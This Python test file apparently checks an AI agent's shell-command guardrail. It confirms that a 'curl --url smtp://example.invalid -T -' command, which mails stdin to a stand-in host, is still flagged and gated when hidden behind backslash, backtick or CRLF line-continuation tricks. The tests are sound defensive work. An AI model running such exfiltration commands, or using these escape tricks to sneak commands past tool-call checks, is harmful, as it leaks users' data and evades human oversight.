"""PR #10 review: normalize each shell without hiding another command."""
import time

import pytest

from test_eyes import _cua_setup
from test_money_email import _install
from test_rails import load


@pytest.mark.parametrize("prefix", ["echo " + chr(92) + chr(96) + "\n", "echo " + chr(92) + "\r\n"])
@pytest.mark.parametrize("tool", ["bash", "terminal", "shell"])
@pytest.mark.parametrize("verdict", ["no", "unsure", "down", "yes", "shadow"])
def test_bash_boundaries_still_authorize(tmp_path, monkeypatch, prefix, tool, verdict):
    rails, ctx, _ = _cua_setup(tmp_path, monkeypatch, mode="off")
    seen = _install(rails, p={"no": 0.1, "unsure": 0.5, "yes": 0.91}.get(verdict, 0.1),
                    boom=verdict == "down")
    if verdict == "shadow":
        rails.MONEY_EMAIL_MODE = "shadow"
    command = prefix + "curl --url smtp://example.invalid -T -"
    assert rails._terminal_area(command, tool) == "email"
    assert not rails.read_only(command)
    result = ctx.hooks["pre_tool_call"](tool_name=tool, args={"command": command},
                                       session_id="s", turn_id="t1")
    assert [call for call in seen if "authorize" in call] == [["authorize"]]
    if verdict in {"yes", "shadow"}:
        assert result is None
    else:
        assert result and result["action"] == "block"


@pytest.mark.parametrize("marker", [chr(92), chr(96)])
def test_large_unmatched_escape_runs_are_linear(tmp_path, marker):
    rails = load(tmp_path)
    command = "echo '" + marker * 40000 + "'"
    started = time.monotonic()
    assert rails._terminal_area(command) is None
    assert time.monotonic() - started < 2.0


@pytest.mark.parametrize("shell,continuation", [("bash", chr(92) + "\n"),
                                                ("powershell", chr(96) + "\n"),
                                                ("powershell", chr(96) + "\r\n")])
def test_known_shell_benign_echo_and_unknown_shell_ambiguity(tmp_path, shell, continuation):
    rails = load(tmp_path)
    command = "echo " + continuation + " curl --url smtp://example.invalid -T -"
    assert rails._terminal_area(command, shell) is None
    # Another shell can interpret the physical newline as an actual command
    # boundary, so a generic terminal must not discard that interpretation.
    assert rails._terminal_area(command) == "email"


@pytest.mark.parametrize("shell,ending", [("bash", "\n"), ("powershell", "\n"),
                                         ("powershell", "\r\n")])
def test_mixed_escapes_do_not_remove_new_command(tmp_path, shell, ending):
    rails = load(tmp_path)
    # Escape the other shell's marker: the physical newline remains a boundary.
    first, second = (chr(92), chr(96)) if shell == "bash" else (chr(96), chr(92))
    command = "echo " + first + second + ending + "curl --url smtp://example.invalid -T -"
    assert rails._terminal_area(command, shell) == "email"


def test_bash_crlf_is_not_a_continuation(tmp_path):
    rails = load(tmp_path)
    command = "curl " + chr(92) + "\r\n --url smtp://example.invalid -T -"
    assert rails._terminal_area(command, "bash") is None
    assert rails._join_shell_continuations(command, "bash") == command
